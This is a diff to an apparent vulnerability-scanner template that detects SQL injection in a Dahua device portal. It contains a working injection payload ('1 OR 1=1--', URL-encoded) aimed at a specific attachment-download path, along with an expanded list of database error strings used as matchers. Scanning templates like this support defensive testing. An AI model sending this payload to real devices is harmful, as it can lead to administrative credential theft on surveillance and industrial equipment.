@@ -9,23 +9,31 @@ info:
     SQL injection that can lead to administrative credential theft.
   reference:
     - https://www.exploit-db.com/exploits/40863
-  tags: china-iot,dahua,sqli
+  metadata:
+    max-request: 1
+  tags: china-iot,dahua,sqli,ics
 
 requests:
   - method: GET
+    redirects: true
+    max-redirects: 3
     path:
-      - "{{BaseURL}}/portal/attachment_downloadByUrlAtt.action?filePath=1'%20OR%201=1--"
+      - "{{BaseURL}}/portal/attachment_downloadByUrlAtt.action?filePath=1%27%20OR%201%3D1--"
 
     matchers-condition: and
     matchers:
       - type: status
         status:
           - 200
-          - 500
 
       - type: word
         words:
           - "SQL"
           - "syntax error"
           - "JDBC"
+          - "ORA-"
+          - "mysql_fetch"
+          - "Unclosed quotation"
+          - "quoted string not properly terminated"
+          - "SQLiteException"
         condition: or
